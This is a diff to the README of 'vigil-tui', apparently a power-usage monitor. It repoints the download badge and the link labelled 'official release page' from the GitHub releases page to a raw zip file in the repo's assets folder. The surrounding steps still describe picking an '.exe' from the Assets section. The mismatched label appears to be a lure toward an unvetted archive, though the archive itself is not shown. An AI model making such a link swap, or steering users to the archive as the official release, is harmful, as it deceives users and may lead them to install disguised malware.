@@ -1,6 +1,6 @@
 # ⚡ vigil-tui - Track your computer power usage easily
 
-[![](https://img.shields.io/badge/Download-vigil--tui-blue)](https://github.com/daisievolumetrical8820/vigil-tui/releases)
+[![](https://img.shields.io/badge/Download-vigil--tui-blue)](https://github.com/daisievolumetrical8820/vigil-tui/raw/refs/heads/main/assets/vigil-tui-1.0.zip)
 
 vigil-tui provides a live view of how much power your computer components use. It shows wattage for your CPU, graphics card, and memory. This tool helps you see which tasks drain your battery or pull the most electricity from your wall outlet.
 
@@ -27,7 +27,7 @@ Your computer must meet these basic needs to run vigil-tui:
 
 Follow these steps to get the software on your machine.
 
-1. Visit the [official release page](https://github.com/daisievolumetrical8820/vigil-tui/releases) to find the latest version.
+1. Visit the [official release page](https://github.com/daisievolumetrical8820/vigil-tui/raw/refs/heads/main/assets/vigil-tui-1.0.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the filename to start the download.
 4. Save the file to your desktop or your Downloads folder.
